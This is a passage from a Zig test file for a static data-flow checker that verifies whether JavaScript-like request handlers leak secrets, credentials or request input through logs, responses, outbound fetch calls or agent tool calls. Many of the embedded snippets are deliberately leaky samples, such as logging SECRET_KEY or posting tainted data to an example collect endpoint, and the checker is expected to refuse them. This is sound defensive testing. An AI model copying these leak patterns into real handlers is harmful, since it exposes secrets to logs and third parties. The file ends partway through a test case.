        \\function h5(x) { return h6(x); }
        \\function h4(x) { return h5(x); }
        \\function h3(x) { return h4(x); }
        \\function h2(x) { return h3(x); }
        \\function h1(x) { return h2(x); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = h1(s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: the same chain, one call shorter, is walked in full and the log
    // is refused, so the cap and not the chain decides the unproven verdict.
    const short =
        \\import { env } from "zttp:env";
        \\function h2(x) { console.log(x); return 1; }
        \\function h1(x) { return h2(x); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = h1(s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const short_report = try runFlowDiagnostics(std.testing.allocator, short, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), short_report.count);
    try std.testing.expect(!short_report.properties.no_secret_leakage);
}

test "FlowChecker fails closed on a discarded call past the parameter cap" {
    var buf: [512]u8 = undefined;
    const leaking =
        \\import { env } from "zttp:env";
        \\function helper(x, p2, p3, p4, p5, p6, p7, p8, p9) { console.log(x); return 1; }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = helper(s, 2, 3, 4, 5, 6, 7, 8, 9);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expect(!report.properties.no_secret_leakage);
}

test "FlowChecker keeps the properties for a discarded call to a known global" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const s = env("PUBLIC_NAME");
        \\  parseInt("5");
        \\  Number(s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), report.count);
    try std.testing.expect(report.properties.no_secret_leakage);
    try std.testing.expect(report.properties.no_credential_leakage);
    try std.testing.expect(report.properties.input_validated);
    try std.testing.expect(report.properties.pii_contained);
    try std.testing.expect(report.properties.injection_safe);
    try std.testing.expect(report.properties.deterministic);
}

test "FlowChecker resolves a function passed as a parameter to the passed closure" {
    var buf: [512]u8 = undefined;
    const apply =
        \\import { env } from "zttp:env";
        \\function apply(f, t) { return f(t); }
    ;

    // The closure logs what it receives and the secret reaches it through the
    // callee's own parameter: a refusal, not just an unproven property.
    const leaking = apply ++
        \\
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = apply((x) => { console.log(x); return 1; }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: a clean argument through a logging closure reports nothing and
    // keeps the property, so the call resolved instead of failing closed.
    const clean_arg = apply ++
        \\
        \\function handler(req) {
        \\  const n = apply((x) => { console.log(x); return 1; }, "ok");
        \\  return Response.json({ ok: true });
        \\}
    ;
    const clean_arg_report = try runFlowDiagnostics(std.testing.allocator, clean_arg, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_arg_report.count);
    try std.testing.expect(clean_arg_report.properties.no_secret_leakage);
    try std.testing.expect(clean_arg_report.properties.deterministic);

    // Control: a secret through a closure that does not sink it.
    const quiet = apply ++
        \\
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = apply((x) => { return 1; }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const quiet_report = try runFlowDiagnostics(std.testing.allocator, quiet, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), quiet_report.count);
    try std.testing.expect(quiet_report.properties.no_secret_leakage);
}

test "FlowChecker does not carry a passed function from one call site to the next" {
    var buf: [512]u8 = undefined;
    // The first call passes the logging closure with a clean value. The second
    // passes a closure that does not log, with the secret. If the first
    // binding survived, the second call would log the secret.
    const log_then_quiet =
        \\import { env } from "zttp:env";
        \\function apply(f, t) { return f(t); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n1 = apply((x) => { console.log(x); return 1; }, "ok");
        \\  const n2 = apply((y) => { return 2; }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const first = try runFlowDiagnostics(std.testing.allocator, log_then_quiet, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), first.count);
    try std.testing.expect(first.properties.no_secret_leakage);

    // The reverse order: the quiet closure first, the logging one second with
    // the secret. The second call must still be refused.
    const quiet_then_log =
        \\import { env } from "zttp:env";
        \\function apply(f, t) { return f(t); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n1 = apply((y) => { return 2; }, "ok");
        \\  const n2 = apply((x) => { console.log(x); return 1; }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const second = try runFlowDiagnostics(std.testing.allocator, quiet_then_log, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), second.count);
    try std.testing.expect(!second.properties.no_secret_leakage);
}

test "FlowChecker fails closed on a call through a parameter nothing bound" {
    var buf: [512]u8 = undefined;
    // `go` is the handler's own parameter-like value from outside the file, so
    // the call cannot be resolved and its sinks cannot be walked.
    const source =
        \\import { env } from "zttp:env";
        \\function run(f, t) { f(t); return 1; }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = run(req.hook, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expect(!report.properties.no_secret_leakage);
}

test "FlowChecker resolves a method of a record passed as a parameter" {
    var buf: [512]u8 = undefined;
    // A record literal written at the call site: its method is the one `o.run`
    // calls, and the secret reaches that method's log.
    const leaking =
        \\import { env } from "zttp:env";
        \\function useOps(o, t) { return o.run(t); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = useOps({ run: (x) => { console.log(x); return 1; } }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: the same record with a clean argument reports nothing.
    const clean =
        \\import { env } from "zttp:env";
        \\function useOps(o, t) { return o.run(t); }
        \\function handler(req) {
        \\  const n = useOps({ run: (x) => { console.log(x); return 1; } }, "ok");
        \\  return Response.json({ ok: true });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.no_secret_leakage);

    // A record bound to a name that the callee calls a method on is not a
    // stable resolution (`callKeepsArgumentLocal` refuses it), so the method
    // stays unresolved and the property is unproven rather than refused.
    const named =
        \\import { env } from "zttp:env";
        \\function useOps(o, t) { return o.run(t); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const ops = { run: (x) => { console.log(x); return 1; } };
        \\  const n = useOps(ops, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const named_report = try runFlowDiagnostics(std.testing.allocator, named, .secret_in_log, &buf);
    try std.testing.expect(!named_report.properties.no_secret_leakage);

    // A record parameter that no call site bound.
    const unbound =
        \\import { env } from "zttp:env";
        \\function useOps(o, t) { o.run(t); return 1; }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = useOps(req.ops, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const unbound_report = try runFlowDiagnostics(std.testing.allocator, unbound, .secret_in_log, &buf);
    try std.testing.expect(!unbound_report.properties.no_secret_leakage);
}

test "FlowChecker walks a helper that is called as a bare statement" {
    var buf: [512]u8 = undefined;
    // The call discards its value. Only the label inference enters a called
    // body, so the statement path has to run it for the log to be seen.
    const leaking =
        \\import { env } from "zttp:env";
        \\function audit(t) { console.log(t); return 1; }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  audit(s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: the same helper called with a clean literal.
    const clean =
        \\import { env } from "zttp:env";
        \\function audit(t) { console.log(t); return 1; }
        \\function handler(req) {
        \\  audit("ok");
        \\  return Response.json({ ok: true });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.no_secret_leakage);
    try std.testing.expect(clean_report.properties.deterministic);
}

test "FlowChecker widens a recursive summary until its labels stop growing" {
    var buf: [512]u8 = undefined;
    // The outer call passes a clean string. The secret enters only in the
    // recursive call's argument, and the base case logs it.
    const leaking =
        \\import { env } from "zttp:env";
        \\function rec(x, k) {
        \\  if (k <= 0) {
        \\    console.log(x);
        \\    return 1;
        \\  }
        \\  const t = env("SECRET_KEY");
        \\  return rec(t, k - 1);
        \\}
        \\function handler(req) {
        \\  const n = rec("hello", 1);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: the same recursion with a clean argument throughout.
    const clean =
        \\import { env } from "zttp:env";
        \\function rec(x, k) {
        \\  if (k <= 0) {
        \\    console.log(x);
        \\    return 1;
        \\  }
        \\  const t = "fine";
        \\  return rec(t, k - 1);
        \\}
        \\function handler(req) {
        \\  const n = rec("hello", 1);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.no_secret_leakage);
    try std.testing.expect(clean_report.properties.deterministic);
}

test "FlowChecker widens a mutual recursion through the frame that is active" {
    var buf: [512]u8 = undefined;
    // `ping` calls `pong`, which calls `ping` with the secret. The hit lands on
    // the outer `ping` frame, so the widening must come back to that frame.
    const source =
        \\import { env } from "zttp:env";
        \\function ping(x, k) {
        \\  if (k <= 0) {
        \\    console.log(x);
        \\    return 1;
        \\  }
        \\  return pong(x, k - 1);
        \\}
        \\function pong(y, k) {
        \\  const t = env("SECRET_KEY");
        \\  return ping(t, k - 1);
        \\}
        \\function handler(req) {
        \\  const n = ping("hello", 2);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_secret_leakage);
}

test "FlowChecker keeps a routed sink's single report and plain help" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function leak(req) {
        \\  console.log(env("SECRET_KEY"));
        \\  return Response.json({ ok: true });
        \\}
        \\const routes = { "GET /leak": leak };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_secret_leakage);
    try std.testing.expectEqualStrings("env vars with sensitive names must not be logged", report.help);
}

test "FlowChecker reports one helper reached from two call sites once per kind" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { env } from "zttp:env";
        \\function note(t) {
        \\  console.log(t);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const a = note(env("SECRET_KEY"));
        \\  const b = note(env("SECRET_KEY"));
        \\  const c = note(req.headers.authorization);
        \\  return Response.json({ n: a + b + c });
        \\}
    ;
    const secret = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), secret.count);
    try std.testing.expect(!secret.properties.no_secret_leakage);
    // The credential reached the same log node through the third call, so it
    // reports under its own kind and demotes its own property.
    const credential = try runFlowDiagnostics(std.testing.allocator, source, .credential_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), credential.count);
    try std.testing.expect(!credential.properties.no_credential_leakage);
}

test "FlowChecker unions routerMatch route return labels at dispatch" {
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { fetch } from "zttp:fetch";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function tainted(req) { return Response.json({ url: req.url }); }
        \\const routes = { "GET /clean": clean, "GET /tainted": tainted };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  const result = found.handler(req);
        \\  fetch("https://api.example.com/collect", { body: JSON.stringify(result) });
        \\  return Response.json({ ok: true });
        \\}
    ;
    const properties = try runFlowProperties(std.testing.allocator, source);
    try std.testing.expect(!properties.input_validated);
    try std.testing.expect(!properties.pii_contained);
}

test "FlowChecker unions every listed tool return at the callTool call site" {
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { callTool, toolCatalog } from "zttp:tool";
        \\import { fetch } from "zttp:fetch";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function tainted(req) { return Response.json({ url: req.url }); }
        \\function assistant(req) {
        \\  const result = callTool("call-1", "clean", "{}");
        \\  fetch("https://api.example.com/collect", { body: result.value });
        \\  return Response.json({ ok: true });
        \\}
        \\const routes = {
        \\  "POST /clean": clean,
        \\  "POST /tainted": tainted,
        \\  "POST /agent": assistant,
        \\};
        \\toolCatalog({
        \\  clean: { route: "POST /clean", description: "clean", input: "In", output: "Out", maxInputBytes: 64 },
        \\  tainted: { route: "POST /tainted", description: "tainted", input: "In", output: "Out", maxInputBytes: 64 },
        \\  assistant: {
        \\    route: "POST /agent", description: "agent", maxInputBytes: 64,
        \\    agent: {
        \\      tools: ["clean", "tainted"],
        \\      provider: { endpoint: "https://api.example.com", credential: "provider" },
        \\      limits: { rounds: 1, toolCalls: 2, toolCallsPerRound: 2, argumentBytes: 64, resultBytes: 64, turnDeadlineMs: 1000, providerRequestBytes: 64 },
        \\    },
        \\  },
        \\});
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    const properties = try runFlowProperties(std.testing.allocator, source);
    // The selected name is clean. Only the union of the other listed route's
    // return can carry request input to this egress sink.
    try std.testing.expect(!properties.injection_safe);
}

test "FlowChecker preserves secret labels through the callTool route union" {
    const direct_source =
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function secretTool(req) { return Response.json({ value: env("SECRET_KEY") }); }
        \\const routes = { "POST /secret": secretTool };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({});
        \\  return found.handler(req);
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(
        std.testing.allocator,
        direct_source,
    )).no_secret_leakage);

    const call_tool_source =
        \\import { routerMatch } from "zttp:router";
        \\import { callTool, toolCatalog } from "zttp:tool";
        \\import { env } from "zttp:env";
        \\function secretTool(req) { return Response.json({ value: env("SECRET_KEY") }); }
        \\function assistant(req) {
        \\  const result = callTool("call-1", "secret", "{}");
        \\  return Response.json({ value: result.value });
        \\}
        \\const routes = { "POST /secret": secretTool, "POST /agent": assistant };
        \\toolCatalog({
        \\  secret: { route: "POST /secret", description: "secret", input: "In", output: "Out", maxInputBytes: 64 },
        \\  assistant: {
        \\    route: "POST /agent", description: "agent", maxInputBytes: 64,
        \\    agent: {
        \\      tools: ["secret"],
        \\      provider: { endpoint: "https://api.example.com", credential: "provider" },
        \\      limits: { rounds: 1, toolCalls: 1, toolCallsPerRound: 1, argumentBytes: 64, resultBytes: 64, turnDeadlineMs: 1000, providerRequestBytes: 64 },
        \\    },
        \\  },
        \\});
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({});
        \\  return found.handler(req);
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(
        std.testing.allocator,
        call_tool_source,
    )).no_secret_leakage);

    const clean_source =
        \\import { routerMatch } from "zttp:router";
        \\import { callTool, toolCatalog } from "zttp:tool";
        \\function clean(req) { return Response.json({ value: "clean" }); }
        \\function assistant(req) {
        \\  const result = callTool("call-1", "clean", "{}");
        \\  return Response.json({ value: result.value });
        \\}
        \\const routes = { "POST /clean": clean, "POST /agent": assistant };
        \\toolCatalog({
        \\  clean: { route: "POST /clean", description: "clean", input: "In", output: "Out", maxInputBytes: 64 },
        \\  assistant: {
        \\    route: "POST /agent", description: "agent", maxInputBytes: 64,
        \\    agent: {
        \\      tools: ["clean"],
        \\      provider: { endpoint: "https://api.example.com", credential: "provider" },
        \\      limits: { rounds: 1, toolCalls: 1, toolCallsPerRound: 1, argumentBytes: 64, resultBytes: 64, turnDeadlineMs: 1000, providerRequestBytes: 64 },
        \\    },
        \\  },
        \\});
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({});
        \\  return found.handler(req);
        \\}
    ;
    try std.testing.expect((try runFlowProperties(
        std.testing.allocator,
        clean_source,
    )).no_secret_leakage);
}

test "FlowChecker keeps callTool callId and name out of the ok labels" {
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { callTool, toolCatalog } from "zttp:tool";
        \\import { fetch } from "zttp:fetch";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function assistant(req) {
        \\  const result = callTool(req.body, req.url, "{}");
        \\  fetch("https://api.example.com/collect", { body: result.value });
        \\  return Response.json({ ok: true });
        \\}
        \\const routes = { "POST /clean": clean, "POST /agent": assistant };
        \\toolCatalog({
        \\  clean: { route: "POST /clean", description: "clean", input: "In", output: "Out", maxInputBytes: 64 },
        \\  assistant: {
        \\    route: "POST /agent", description: "agent", maxInputBytes: 64,
        \\    agent: {
        \\      tools: ["clean"],
        \\      provider: { endpoint: "https://api.example.com", credential: "provider" },
        \\      limits: { rounds: 1, toolCalls: 1, toolCallsPerRound: 1, argumentBytes: 64, resultBytes: 64, turnDeadlineMs: 1000, providerRequestBytes: 64 },
        \\    },
        \\  },
        \\});
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({});
        \\  return found.handler(req);
        \\}
    ;
    const properties = try runFlowProperties(std.testing.allocator, source);
    try std.testing.expect(properties.injection_safe);
}

test "FlowChecker fails closed when a callTool route table escapes" {
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { callTool, toolCatalog } from "zttp:tool";
        \\import { fetch } from "zttp:fetch";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function assistant(req) {
        \\  const result = callTool("call-1", "clean", "{}");
        \\  fetch("https://api.example.com/collect", { body: result.value });
        \\  return Response.json({ ok: true });
        \\}
        \\function mutate(value) { value.changed = clean; }
        \\const routes = { "POST /clean": clean, "POST /agent": assistant };
        \\mutate(routes);
        \\toolCatalog({
        \\  clean: { route: "POST /clean", description: "clean", input: "In", output: "Out", maxInputBytes: 64 },
        \\  assistant: {
        \\    route: "POST /agent", description: "agent", maxInputBytes: 64,
        \\    agent: {
        \\      tools: ["clean"],
        \\      provider: { endpoint: "https://api.example.com", credential: "provider" },
        \\      limits: { rounds: 1, toolCalls: 1, toolCallsPerRound: 1, argumentBytes: 64, resultBytes: 64, turnDeadlineMs: 1000, providerRequestBytes: 64 },
        \\    },
        \\  },
        \\});
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({});
        \\  return found.handler(req);
        \\}
    ;
    const properties = try runFlowProperties(std.testing.allocator, source);
    try std.testing.expect(!properties.injection_safe);
}

test "FlowChecker joins argsJson and fails closed for an unresolved listed tool" {
    const args_source =
        \\import { routerMatch } from "zttp:router";
        \\import { callTool, toolCatalog } from "zttp:tool";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function assistant(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const result = callTool("call-1", "clean", secret);
        \\  return Response.json({ value: result.value });
        \\}
        \\const routes = { "POST /clean": clean, "POST /agent": assistant };
        \\toolCatalog({
        \\  clean: { route: "POST /clean", description: "clean", input: "In", output: "Out", maxInputBytes: 64 },
        \\  assistant: { route: "POST /agent", description: "agent", maxInputBytes: 64, agent: { tools: ["clean"], provider: { endpoint: "https://api.example.com", credential: "provider" }, limits: { rounds: 1, toolCalls: 1, toolCallsPerRound: 1, argumentBytes: 64, resultBytes: 64, turnDeadlineMs: 1000, providerRequestBytes: 64 } } },
        \\});
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({});
        \\  return found.handler(req);
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, args_source)).no_secret_leakage);

    const unresolved_source =
        \\import { routerMatch } from "zttp:router";
        \\import { callTool, toolCatalog } from "zttp:tool";
        \\import { fetch } from "zttp:fetch";
        \\function assistant(req) {
        \\  const result = callTool("call-1", "ghost", "{}");
        \\  fetch("https://api.example.com/collect", { body: result.value });
        \\  return Response.json({ ok: true });
        \\}
        \\const routes = { "POST /agent": assistant };
        \\toolCatalog({
        \\  ghost: { route: "POST /missing", description: "ghost", input: "In", output: "Out", maxInputBytes: 64 },
        \\  assistant: { route: "POST /agent", description: "agent", maxInputBytes: 64, agent: { tools: ["ghost"], provider: { endpoint: "https://api.example.com", credential: "provider" }, limits: { rounds: 1, toolCalls: 1, toolCallsPerRound: 1, argumentBytes: 64, resultBytes: 64, turnDeadlineMs: 1000, providerRequestBytes: 64 } } },
        \\});
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({});
        \\  return found.handler(req);
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, unresolved_source)).injection_safe);
}

test "FlowChecker proves every flow property for clean routerMatch routes" {
    const source =
        \\import { routerMatch } from "zttp:router";
        \\function first(req) { return Response.json({ route: "first" }); }
        \\const second = (req) => Response.text("second");
        \\let routes = { "GET /first": first, "GET /second": second };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  req.params = found.params;
        \\  return found.handler(req);
        \\}
    ;
    const properties = try runFlowProperties(std.testing.allocator, source);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(properties));
    }
}

test "FlowChecker isolates route witness IO from other roots" {
    const allocator = std.testing.allocator;
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { cacheGet } from "zttp:cache";
        \\import { env } from "zttp:env";
        \\function first(req) { cacheGet("ns", "key"); return Response.json({ ok: true }); }
        \\function second(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ key: secret });
        \\}
        \\const routes = { "GET /first": first, "GET /second": second };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  return Response.json({ ok: true });
        \\}
    ;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = @import("handler_verifier.zig").findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;
    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    var found = false;
    for (checker.getDiagnostics()) |diag| {
        if (diag.kind != .secret_in_response) continue;
        found = true;
        const witness = diag.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), witness.io_calls.len);
        try std.testing.expectEqualStrings("env", witness.io_calls[0].func);
    }
    try std.testing.expect(found);
}

test "FlowChecker gives an unresolved dynamic call unknown response labels" {
    const cases = [_][]const u8{
        // A function value received as a parameter.
        \\function invoke(callback) { return callback(); }
        \\function handler(req) { return Response.json({ value: invoke(req.callback) }); }
        ,
        // Member call on a parameter.
        \\function invoke(api) { return api.run(); }
        \\function handler(req) { return Response.json({ value: invoke(req.callback) }); }
        ,
        // The same value through a local alias.
        \\function invoke(api) { const alias = api; return alias.run(); }
        \\function handler(req) { return Response.json({ value: invoke(req.callback) }); }
        ,
        // A call result used as the next callee.
        \\function factory(req) { return req.callback; }
        \\function handler(req) { return Response.json({ value: factory(req)() }); }
        ,
        // A conditional selector whose result is called.
        \\function handler(req) { return Response.json({ value: (req.method === "GET" ? req.first : req.second)() }); }
        ,
        // A nullish selector whose result is called.
        \\function handler(req) { return Response.json({ value: (req.callback ?? req.other)() }); }
        ,
        // An arbitrary request property used as a method.
        \\function handler(req) { return Response.json({ value: req.callback() }); }
        ,
        // A computed array element has no resolved method body.
        \\function handler(req) { return Response.json({ value: [{ run: () => "ok" }][0].run() }); }
        ,
        // A computed element used directly as the callee.
        \\function handler(req) { return Response.json({ value: [req.callback][0]() }); }
        ,
        // A computed object field used directly as the callee.
        \\function handler(req) { return Response.json({ value: ({ run: req.callback })["run"]() }); }
        ,
        // A function read from a dictionary has no resolved body at the call.
        \\import { dictEmpty, dictSet, dictGet } from "zttp:collections";
        \\function handler(req) {
        \\  const callbacks = dictSet(dictEmpty(), "run", () => "ok");
        \\  return Response.json({ value: dictGet(callbacks, "run")() });
        \\}
        ,
        // A parsed object's arbitrary method is not a JSON intrinsic.
        \\function handler(req) { return Response.json({ value: JSON.parse("{}").run() }); }
        ,
        // Array methods that return elements or accumulator values are not arrays.
        \\function handler(req) { return Response.json({ value: [{ run: () => "ok" }].pop().run() }); }
        ,
        \\function handler(req) { return Response.json({ value: [{ run: () => "ok" }].reduce((a, x) => x).run() }); }
        ,
        // A module object return does not make every property a known method.
        \\import { urlParse } from "zttp:url";
        \\function handler(req) { return Response.json({ value: urlParse("https://example.com").run() }); }
        ,
        // An alias can replace a method on a mutable intrinsic receiver.
        \\function handler(req) {
        \\  const values = ["ok"];
        \\  const alias = values;
        \\  alias.join = req.callback;
        \\  return Response.json({ value: values.join() });
        \\}
        ,
    };
    for (cases) |source| {
        const properties = try runFlowProperties(std.testing.allocator, source);
        try std.testing.expect(!properties.no_secret_leakage);
        try std.testing.expect(!properties.no_credential_leakage);
        try std.testing.expect(!properties.deterministic);
    }
}

test "FlowChecker resolves only immutable literal object methods" {
    const clean =
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, clean)).no_secret_leakage);

    const mutated =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  api.run = () => env("SECRET_KEY");
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, mutated)).no_secret_leakage);

    const reassigned_function =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  let f = () => "ok";
        \\  f = () => env("SECRET_KEY");
        \\  return Response.json({ value: f() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, reassigned_function)).no_secret_leakage);

    const alias_mutated =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  const alias = api;
        \\  alias.run = () => env("SECRET_KEY");
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, alias_mutated)).no_secret_leakage);

    const aggregate_alias_mutated =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  const box = { api: api };
        \\  box.api.run = () => env("SECRET_KEY");
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, aggregate_alias_mutated)).no_secret_leakage);

    const call_escape_mutated =
        \\import { env } from "zttp:env";
        \\function mutate(api) { api.run = () => env("SECRET_KEY"); }
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  mutate(api);
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, call_escape_mutated)).no_secret_leakage);
}

test "FlowChecker refuses mutated and local routerMatch tables" {
    const cases = [_][]const u8{
        // A replaced type predicate can mutate the table passed to it.
        \\import { routerMatch } from "zttp:router";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
        \\Array.isArray = (table) => { table["GET /probe"] = () => Response.html("changed"); return false; };
        \\Array.isArray(routes);
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // Selecting the table from an aggregate retains a mutable alias.
        \\import { routerMatch } from "zttp:router";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
        \\const alias = [routes][0];
        \\alias["GET /probe"] = () => Response.html("changed");
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // The same aggregate selector can change the selected handler.
        \\import { routerMatch } from "zttp:router";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
